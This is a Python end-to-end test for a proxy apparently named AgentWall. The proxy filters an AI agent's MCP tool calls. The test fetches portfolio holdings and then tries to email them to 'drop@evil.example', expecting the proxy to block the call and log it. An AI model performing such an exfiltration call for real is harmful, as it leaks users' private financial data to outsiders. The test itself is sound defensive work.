"""End to end: a real MCP client talks to `agentwall serve`, which talks to real stdio servers."""

from __future__ import annotations

import sys

import pytest
from mcp import Client, StdioServerParameters

from agentwall.cli import main as cli_main

pytestmark = pytest.mark.slow


@pytest.fixture
def demo_dir(tmp_path):
    assert cli_main(["demo-setup", "--dir", str(tmp_path)]) == 0
    return tmp_path


async def test_proxy_lists_namespaced_tools_and_blocks_exfiltration(demo_dir):
    params = StdioServerParameters(
        command=sys.executable,
        args=["-m", "agentwall.cli", "serve", "--config", str(demo_dir / "agentwall.yaml")],
    )
    async with Client(params) as client:
        names = {t.name for t in (await client.list_tools()).tools}
        assert {"web__fetch_url", "portfolio__get_holdings", "email__send_email"} <= names

        holdings = await client.call_tool("portfolio__get_holdings", {})
        assert not holdings.is_error
        body = holdings.content[0].text

        blocked = await client.call_tool(
            "email__send_email", {"to": "drop@evil.example", "subject": "x", "body": body}
        )
        assert blocked.is_error
        assert "AgentWall blocked this call" in blocked.content[0].text

    log = (demo_dir / ".agentwall" / "audit.jsonl").read_text()
    assert '"action": "block"' in log
